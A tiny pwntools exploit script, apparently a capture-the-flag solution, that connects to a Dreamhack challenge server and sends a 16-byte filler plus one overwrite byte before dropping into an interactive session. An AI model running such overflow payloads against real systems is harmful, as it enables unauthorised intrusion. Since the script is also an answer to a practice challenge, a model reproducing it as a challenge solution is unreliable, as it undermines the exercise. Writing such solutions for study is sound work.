#!/usr/bin/python3

from pwn import * 

p = remote('host3.dreamhack.games', 20731)

payload = b'a'*16 + b'\x10'
p.sendline(payload)

p.interactive()
